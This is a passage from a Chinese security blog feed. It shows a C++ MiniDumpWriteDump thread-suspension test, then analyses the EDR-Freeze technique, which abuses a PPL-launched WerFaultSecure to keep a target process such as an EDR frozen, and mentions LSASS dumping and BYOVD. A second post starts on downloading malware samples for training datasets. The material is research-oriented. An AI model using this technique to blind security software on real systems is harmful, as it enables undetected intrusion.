-static-libgcc -static-libstdc++</span><br><span class="line">./Target.exe</span><br></pre></td></tr></table></figure><p>它会输出类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Target Process Started (PID: 1234)</span><br><span class="line">Thread 0 is running...</span><br><span class="line">Thread 1 is running...</span><br><span class="line">Thread 2 is running...</span><br><span class="line">Main thread is running...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><hr><h3 id="转储进程（Dumper-exe）"><a href="#转储进程（Dumper-exe）" class="headerlink" title="转储进程（Dumper.exe）"></a><strong>转储进程（Dumper.exe）</strong></h3><p>这个程序会附加到目标进程并调用 <code>MiniDumpWriteDump</code>，同时检查目标进程的线程状态。</p><h3 id="C-代码（Dumper-cpp）"><a href="#C-代码（Dumper-cpp）" class="headerlink" title="C++ 代码（Dumper.cpp）"></a><strong>C++ 代码（Dumper.cpp）</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dbghelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;dbghelp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查目标进程的线程状态</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CheckThreads</span><span class="params">(DWORD pid)</span> &#123;</span><br><span class="line">    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to create thread snapshot!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    THREADENTRY32 te32;</span><br><span class="line">    te32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!Thread32First(hThreadSnap, &amp;te32)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Thread32First failed!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        CloseHandle(hThreadSnap);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (te32.th32OwnerProcessID == pid) &#123;</span><br><span class="line">            HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);</span><br><span class="line">            <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">                DWORD suspendCount = SuspendThread(hThread); <span class="comment">// 尝试挂起线程</span></span><br><span class="line">                <span class="keyword">if</span> (suspendCount == (DWORD)<span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Thread &quot;</span> &lt;&lt; te32.th32ThreadID &lt;&lt; <span class="string">&quot; is already suspended!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Thread &quot;</span> &lt;&lt; te32.th32ThreadID &lt;&lt; <span class="string">&quot; was running (suspend count: &quot;</span> &lt;&lt; suspendCount &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                    ResumeThread(hThread); <span class="comment">// 恢复线程</span></span><br><span class="line">                &#125;</span><br><span class="line">                CloseHandle(hThread);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Thread32Next(hThreadSnap, &amp;te32));</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    DWORD targetPid;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter Target Process ID (PID): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; targetPid;</span><br><span class="line"></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to open target process! Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking thread states before dump...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    CheckThreads(targetPid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 minidump</span></span><br><span class="line">    HANDLE hFile = CreateFile(</span><br><span class="line">        <span class="string">L&quot;test.dmp&quot;</span>,</span><br><span class="line">        GENERIC_WRITE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        CREATE_ALWAYS,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to create dump file! Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating minidump...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    BOOL success = MiniDumpWriteDump(</span><br><span class="line">        hProcess,</span><br><span class="line">        targetPid,</span><br><span class="line">        hFile,</span><br><span class="line">        MiniDumpNormal,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;MiniDumpWriteDump failed! Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Minidump created successfully!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking thread states after dump...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    CheckThreads(targetPid);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译 &amp; 运行：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ Dumper.cpp -o Dumper.exe -static-libgcc -static-libstdc++ -l dbghelp</span><br><span class="line">./Dumper.exe</span><br></pre></td></tr></table></figure><p>输入目标进程的 PID（<code>Target.exe</code>的 PID），观察输出。</p><hr><h3 id="预期结果"><a href="#预期结果" class="headerlink" title="预期结果"></a><strong>预期结果</strong></h3><ol><li><strong><code>Target.exe</code>持续输出日志</strong>：<code>Thread 0 is running... Thread 1 is running... Thread 2 is running... Main thread is running...</code></li><li><strong><code>Dumper.exe</code>运行后</strong>：<strong>转储前</strong>：<code>CheckThreads</code>会报告所有线程是 <strong>RUNNING</strong>（<code>SuspendThread</code>返回 <code>0</code>）。<strong>转储期间</strong>：<code>Target.exe</code>的日志输出会 <strong>暂停</strong>（因为所有线程被 <code>MiniDumpWriteDump</code>挂起）。<strong>转储后</strong>：<code>CheckThreads</code>会报告所有线程 <strong>恢复运行</strong>（<code>SuspendThread</code>返回 <code>0</code>）。<code>Target.exe</code>的日志输出 <strong>恢复</strong>。</li></ol><hr><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a><strong>结论</strong></h3><p>✅ <strong>验证成功</strong>：</p><ul><li><code>MiniDumpWriteDump</code><strong>确实会挂起目标进程的所有线程</strong>，以确保内存一致性。</li><li>转储完成后，线程会自动恢复执行。</li></ul><p>⚠ <strong>注意事项</strong>：</p><ul><li>如果目标进程持有关键锁（如堆锁、加载器锁），<strong>在目标进程内部调用 <code>MiniDumpWriteDump</code>可能导致死锁</strong>（验证了微软的建议）。</li><li><strong>最佳实践</strong>：始终从 <strong>外部进程</strong> 调用 <code>MiniDumpWriteDump</code>，以避免死锁问题。</li></ul><hr><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a><strong>完整代码</strong></h3><ul><li><a href="#1-%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8Btargetexe">Target.cpp</a></li><li><a href="#2-%E8%BD%AC%E5%82%A8%E8%BF%9B%E7%A8%8Bdumperexe">Dumper.cpp</a></li></ul><p>你可以编译并运行这两个程序来验证 <code>MiniDumpWriteDump</code>的行为。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250922225450029.png" alt="image-20250922225450029"></p><p>代码是没问题的，但是发现运行之后，没有暂停的效果。原因是这个函数挂起的速度太快了</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250922225957393.png" alt="image-20250922225957393"></p><p>使用大佬工具的话 指定时间10000毫秒，明显有反应。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250922231458306.png" alt="image-20250922231458306"></p><h1 id="分析源码-如何长时间挂起线程"><a href="#分析源码-如何长时间挂起线程" class="headerlink" title="分析源码-如何长时间挂起线程"></a>分析源码-如何长时间挂起线程</h1><h2 id="整体原理（一句话）"><a href="#整体原理（一句话）" class="headerlink" title="整体原理（一句话）"></a>整体原理（一句话）</h2><p>借助系统自带的 WerFaultSecure 在执行转储（dump）时会“冻结”目标进程所有线程，我们只要在目标被 WER 冻结的瞬间把 WER 自身再挂起，就能让目标保持在挂起状态（“冻结”）。到设定时间后结束 WER，目标进程随之恢复。</p><p><strong>WerFaultSecure</strong>支持在 <strong>WinTCB级别使用****PPL</strong>保护运行。</p><p><a href="https://www.zerosalarium.com/2025/09/Dumping-LSASS-With-WER-On-Modern-Windows-11.html">参考</a>逆向工程的 运行<strong>WerFaultSecure</strong> 的参数，我们可以使用它来激活任何所需进程的 <strong>MiniDumpWriteDump函数。</strong></p><p>对应代码：</p><ul><li>入口：<code>wmain</code>（<code>EDR-Freeze.cpp</code>）</li><li>主流程：<code>FreezeRun</code>（<code>EDR-Freeze.cpp</code>）</li><li>监控线程：<code>PauseCheck</code>（<code>EDR-Freeze.cpp</code>）</li><li>工具函数：<code>ProcessMisc.h/.cpp</code>（权限、线程枚举、挂起&#x2F;终止等）</li><li>启动 WER（PPL 进程）：<code>PPLHelp.h/.cpp</code></li></ul><hr><h2 id="为什么要把-WerFaultSecure-作为子进程启动？"><a href="#为什么要把-WerFaultSecure-作为子进程启动？" class="headerlink" title="为什么要把 WerFaultSecure 作为子进程启动？"></a>为什么要把 WerFaultSecure 作为子进程启动？</h2><p>代码通过 <code>CreateProcessW</code> 启动 <code>C:\Windows\System32\WerFaultSecure.exe</code>，自然成为当前工具进程的“子进程”。这样做有三个关键原因：</p><ol><li>利用系统行为：不直接注入或篡改目标进程，而是“借力”系统组件 WER 的冻结&#x2F;转储能力。</li><li>继承句柄：我们给 WER 传递了可继承的文件和事件句柄（命令行里 <code>/encfile &lt;句柄&gt;</code>、<code>/cancel &lt;句柄&gt;</code>），要让子进程继承并使用这些句柄。</li><li>提升保护：通过 <code>PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL + CREATE_PROTECTED_PROCESS</code> 把 WER 以 PPL 级别拉起（见 <code>PPLProcessCreator::CreatePPLProcess</code>），减少被安全产品拦截的概率。</li></ol><p>代码位置速览：</p><ul><li>构造命令行与可继承句柄：<code>FreezeRun</code>（<code>EDR-Freeze.cpp</code>）</li><li>创建 PPL 子进程：<code>PPLProcessCreator::CreatePPLProcess</code>（<code>PPLHelp.cpp</code>）</li></ul><hr><h2 id="只指定主线程-TID，为何“所有线程”都会挂起？"><a href="#只指定主线程-TID，为何“所有线程”都会挂起？" class="headerlink" title="只指定主线程 TID，为何“所有线程”都会挂起？"></a>只指定主线程 TID，为何“所有线程”都会挂起？</h2><p>传给 WerFaultSecure 的 <code>/pid &lt;目标PID&gt;</code> 和 <code>/tid &lt;主线程TID&gt;</code>，其中 TID 更多是“上下文&#x2F;首选线程”的提示点，例如用于栈回溯或异常上下文，并不意味着“仅挂起这一条线程”。</p><p>为了生成一致性的内存转储（尤其像 full dump），WER&#x2F;转储机制会在内部冻结整个目标进程（所有线程）。这可以等价理解为：WER 会对目标进程执行整进程挂起策略（效果类似逐线程 Suspend 或系统调用层面的整进程挂起），直到转储完成后再恢复。</p><p>我们代码并未直接挂起目标进程，而是：</p><ol><li>使用 <code>GetMainThreadId(pid)</code> 得到主线程 ID（仅作为 WER 的参考上下文）。</li><li>用 <code>IsProcessSuspendedByPID(pid)</code> 轮询，判断目标是否进入“所有线程都是 Wait+Suspended”的状态——这恰是 WER 冻结中的特征。</li><li>一旦判断成立，就 <code>SuspendProcessByPID(werPid)</code> 把 WER 自身挂起，从而让目标保持冻结。</li><li>计时结束后 <code>TerminateProcessByPID(werPid)</code> 终止 WER，目标随之解冻。</li></ol><p>相关实现：<code>ProcessMisc.cpp</code> 中的 <code>GetMainThreadId</code>、<code>IsProcessSuspendedByPID</code>、<code>SuspendProcessByPID</code>、<code>TerminateProcessByPID</code>。</p><hr><h2 id="为什么“执行-WER”与“检测冻结并挂起-WER-自身”看起来同时进行？"><a href="#为什么“执行-WER”与“检测冻结并挂起-WER-自身”看起来同时进行？" class="headerlink" title="为什么“执行 WER”与“检测冻结并挂起 WER 自身”看起来同时进行？"></a>为什么“执行 WER”与“检测冻结并挂起 WER 自身”看起来同时进行？</h2><p>因为存在两个并发执行体：</p><ul><li>独立的 WER 进程：<code>CreateProcessW</code> 启动后，WER 由内核调度独立运行，开始对目标做转储并冻结其线程；</li><li>当前进程内的监控线程：<code>CreateThread</code> 启动 <code>PauseCheck</code>，轮询判断目标是否“全线程挂起”，一旦成立就挂起 WER。</li></ul><p>这二者并行执行，因此现象上是“同时进行”。与此同时，主线程在 <code>Sleep(sleepTime)</code>，计时结束再结束 WER。</p><p>并发原语与流程：</p><ol><li><code>CreateProcessW</code> → 启动 WER（子进程）。</li><li><code>CreateThread(PauseCheck)</code> → 启动监控线程，轮询 <code>IsProcessSuspendedByPID</code>。</li><li>监控线程检测到目标已冻结 → 调用 <code>SuspendProcessByPID(werPid)</code> 挂起 WER。</li><li>主线程 <code>Sleep</code> 到期 → <code>TerminateProcessByPID(werPid)</code>，目标恢复。</li></ol><p>可改进点：当前轮询为忙等，可在 <code>PauseCheck</code> 中加入小睡眠（如 <code>Sleep(1~10ms)</code>）或事件同步，降低 CPU 占用并更优雅地收尾。</p><hr><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250922231458306.png" alt="image-20250922231458306"></p><h1 id="分析源码-挂起PPL进程的权限问题"><a href="#分析源码-挂起PPL进程的权限问题" class="headerlink" title="分析源码-挂起PPL进程的权限问题"></a>分析源码-挂起PPL进程的权限问题</h1><h2 id="什么是-PPL（Protected-Process-Light）"><a href="#什么是-PPL（Protected-Process-Light）" class="headerlink" title="什么是 PPL（Protected Process Light）"></a>什么是 PPL（Protected Process Light）</h2><p>PPL 是 Windows 的“受保护进程（轻量版）”机制。与普通进程相比，PPL 在“句柄授予&#x2F;访问控制”上由内核实施更严格的策略：</p><ul><li>即使拥有管理员权限与 SeDebugPrivilege，低保护级别的进程也无法对高保护级别的 PPL 进程获取敏感访问（如读&#x2F;写内存、挂起&#x2F;终止等）。</li><li>只有“同级或更高保护”的调用方（或内核&#x2F;驱动）才能被授予足够权限的句柄。</li></ul><p>PPL 机制的目标是保护系统安全组件（如 LSA、反恶意软件、系统关键服务）免受同机高权限但低可信组件的干扰。</p><hr><h2 id="保护等级的两个维度：Signer-类别-强度（Light-Full）"><a href="#保护等级的两个维度：Signer-类别-强度（Light-Full）" class="headerlink" title="保护等级的两个维度：Signer 类别 + 强度（Light&#x2F;Full）"></a>保护等级的两个维度：Signer 类别 + 强度（Light&#x2F;Full）</h2><p>保护等级不仅是“高&#x2F;低”，它包含两个维度：</p><ul><li>Signer 类别（签名者&#x2F;信任域）：如 Windows、WinTCB、LSA、Antimalware 等；</li><li>强度：Light 表示 PPL（Protected Process Light），Full 表示 PP（受保护进程，强度更高）。</li></ul><p>常见（示意）等级名：</p><ul><li>PROTECTION_LEVEL_WINDOWS_LIGHT &#x2F; PROTECTION_LEVEL_WINDOWS</li><li>PROTECTION_LEVEL_LSA_LIGHT</li><li>PROTECTION_LEVEL_ANTIMALWARE_LIGHT</li><li>PROTECTION_LEVEL_WINTCB_LIGHT &#x2F;（WinTCB Full 属于更高强度的受保护进程）</li></ul><p>说明：不同系统版本与补丁中，可用等级以及比较规则会有差异；总体原则是“Signer 类别 + 强度”共同决定相对高低与可访问性。</p><hr><h2 id="“Full-WinTCB-保护”是什么意思"><a href="#“Full-WinTCB-保护”是什么意思" class="headerlink" title="“Full WinTCB 保护”是什么意思"></a>“Full WinTCB 保护”是什么意思</h2><p>当某进程显示为“WinTCB Full”时，表示它处于非常高的保护级别：</p><ul><li>Signer 类别为 WinTCB（Windows TCB：可信计算基底，系统核心信任域之一）。</li><li>强度为 Full（受保护进程，非 Light），比 PPL 还严格。</li></ul><p>含义：</p><ul><li>只有“同类别且强度不低”的进程，或内核，才可能获得对其的敏感访问。</li><li>普通进程（即使管理员 + SeDebugPrivilege）通常拿不到如 <code>PROCESS_SUSPEND_RESUME</code> 此类敏感权限的进程句柄，自然无法挂起其线程、读取敏感内存或将其终止。</li></ul><hr><h2 id="为什么必须具备足够的-PPL-等级才能“挂起-PPL-进程”"><a href="#为什么必须具备足够的-PPL-等级才能“挂起-PPL-进程”" class="headerlink" title="为什么必须具备足够的 PPL 等级才能“挂起 PPL 进程”"></a>为什么必须具备足够的 PPL 等级才能“挂起 PPL 进程”</h2><p>要挂起线程&#x2F;进程，前提是需要先拿到带有相应访问权的句柄（例如 <code>PROCESS_SUSPEND_RESUME</code>）。在 PPL 模型下，内核会在“句柄授予阶段”检查调用方与目标方的保护级别：</p><ul><li>若调用方保护级别（Signer + Light&#x2F;Full）低于目标，则敏感访问会被拒绝；</li><li>即使 <code>OpenProcess</code> 成功返回句柄，也可能因为访问掩码被降级而不包含所需的敏感权限；</li><li>这就是为什么“要对 PPL 目标做挂起&#x2F;致盲操作，调用方本身也要处于不低于目标的 PPL 等级（或在内核态）”。</li></ul><p>总结为一句话：访问被内核在“授予句柄”时就挡住了，权限不够连门都进不去，谈不上后续 <code>NtSuspendProcess</code> 或 <code>SuspendThread</code>。</p><hr><h2 id="与项目的关系（WerFaultSecure-与-PPL）"><a href="#与项目的关系（WerFaultSecure-与-PPL）" class="headerlink" title="与项目的关系（WerFaultSecure 与 PPL）"></a>与项目的关系（WerFaultSecure 与 PPL）</h2><p>项目会以指定保护级别启动 WerFaultSecure（通过 <code>PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL + CREATE_PROTECTED_PROCESS</code>）：</p><ul><li>实际生效的保护级别，取决于系统策略、二进制签名和平台支持；</li><li>运行时可用 <code>GetProcessInformation(ProcessProtectionLevelInfo)</code> 获取到真实的 ProtectionLevel，并打印为人类可读的名称（见 <code>PPLHelp.cpp</code>）。</li></ul><p>当 WerFaultSecure 处于较高保护级别时（例如 WinTCB Full）：</p><ul><li>普通进程无法对其执行挂起&#x2F;终止等敏感操作；</li><li>这与“我们可以利用 WER 冻结目标进程”并不矛盾，因为冻结目标是 WER 的内部行为，我们只是“检测到目标被 WER 冻住后，再对 WER 自身做状态控制”。是否能“挂起 WER 自身”，取决于你当前进程能否对 WER 获得敏感访问权限（由两者的保护级别比较决定）。</li></ul><hr><h2 id="诊断与实践建议"><a href="#诊断与实践建议" class="headerlink" title="诊断与实践建议"></a>诊断与实践建议</h2><p>诊断：</p><ul><li>打印并核实目标&#x2F;调用方&#x2F;中间方（如 WER）的保护级别，区分 Signer 与 Light&#x2F;Full；</li><li>检查 <code>OpenProcess</code> 返回值以及 <code>GetLastError</code>，确认是否因权限不足无法获得敏感句柄；</li><li>对 <code>MiniDumpWriteDump</code>&#x2F;WER 转储流程与“目标冻结判定”解耦，避免混淆。</li></ul><p>实践建议：</p><ul><li>如果需要对高保护级别的 PPL 进程做破坏性操作（挂起&#x2F;写内存&#x2F;终止），调用方必须具备至少同级的 PPL 等级；</li><li>若做不到，需转向内核途径（驱动&#x2F;BYOVD）或改变策略，避免与高保护级别的进程直接对抗；</li><li>在利用 WER 冻结目标的场景里，重点是“让 WER 内部触发冻结”，而非调用方直接挂起目标。随后对 WER 的操控是否可行，取决于双方的保护级别比较。</li></ul><hr><h2 id="常见问答（FAQ）"><a href="#常见问答（FAQ）" class="headerlink" title="常见问答（FAQ）"></a>常见问答（FAQ）</h2><p><strong>Q: 我有管理员 + SeDebugPrivilege，为什么还是打不开&#x2F;挂不起某些进程？</strong></p><p>A: 因为对方是 PPL&#x2F;PP，且保护级别高于你；内核在授予句柄时做了保护级别检查，你拿不到包含敏感访问的句柄。</p><p><strong>Q: “Full WinTCB”和“WinTCB Light”差别大吗？</strong></p><p>A: 是。Full 是受保护进程（PP），更严格；Light 是 PPL。一般来说 Full &gt; Light。同类 Signer 下，Full 访问要求更苛刻。</p><p><strong>Q: 我如何知道某进程的保护级别？</strong></p><p>A: 使用 <code>GetProcessInformation(ProcessProtectionLevelInfo)</code> 查询，项目中 <code>PPLProcessCreator::GetPPLProtectionLevel</code> 与 <code>GetPPLProtectionLevelName</code> 展示了获取与打印方法。</p><p><strong>Q: 如果 WER 是更高等级，我还能“致盲”它吗？</strong></p><p>A: 取决于你的调用方保护级别。如果不够高，直接挂起&#x2F;终止它通常会失败；这时需改策略：让 WER 自己冻结目标，然后通过你能控制的途径维持&#x2F;结束该状态（比如等待、超时终止、或在你能获取到的权限范围内进行控制）。</p><hr><h2 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h2><p>PPL&#x2F;PP 是“按保护等级授予访问”的内核强制模型。“Full WinTCB”属于高强度高信任域，低等级进程对其敏感操作会在句柄授予阶段被拒绝；要挂起&#x2F;致盲这类进程，调用方必须具备足够高的 PPL 等级（或转向内核层面）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;主要部分&quot;&gt;&lt;a href=&quot;#主要部分&quot; class=&quot;headerlink&quot; title=&quot;主要部分&quot;&gt;&lt;/a&gt;主要部分&lt;/h1&gt;&lt;h2 id=&quot;Minidumpwritedump-函数&quot;&gt;&lt;a href=&quot;#Minidumpwritedump-函数&quot; cla</summary>
      
    
    
    
    <category term="安全开发" scheme="https://250wuyifan.github.io/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="安全开发" scheme="https://250wuyifan.github.io/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>深度学习训练获取恶意代码数据集</title>
    <link href="https://250wuyifan.github.io/2025/09/13/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%AD%E7%BB%83%E8%8E%B7%E5%8F%96%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%95%B0%E6%8D%AE%E9%9B%86/"/>
    <id>https://250wuyifan.github.io/2025/09/13/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%AD%E7%BB%83%E8%8E%B7%E5%8F%96%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%95%B0%E6%8D%AE%E9%9B%86/</id>
    <published>2025-09-13T10:35:31.000Z</published>
    <updated>2025-09-13T10:57:48.728Z</updated>
    
    <content type="html"><![CDATA[<h1 id="免费获取网站"><a href="#免费获取网站" class="headerlink" title="免费获取网站"></a>免费获取网站</h1><p><a href="https://bazaar.abuse.ch/">https://bazaar.abuse.ch/</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913183743756.png" alt="image-20250913183743756"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913183938733.png" alt="image-20250913183938733"></p><h1 id="API接口调用"><a href="#API接口调用" class="headerlink" title="API接口调用"></a>API接口调用</h1><p>可根据自己的要求调用API。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913184040902.png" alt="image-20250913184040902"></p><h1 id="批量下载"><a href="#批量下载" class="headerlink" title="批量下载"></a>批量下载</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913184128568.png" alt="image-20250913184128568"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913184145361.png" alt="image-20250913184145361"></p><h1 id="批量下载脚本"><a href="#批量下载脚本" class="headerlink" title="批量下载脚本"></a>批量下载脚本</h1><p>一个一个手点击下载是满的，脚本是对的。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913185628114.png" alt="image-20250913185628114"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250913185703054.png" 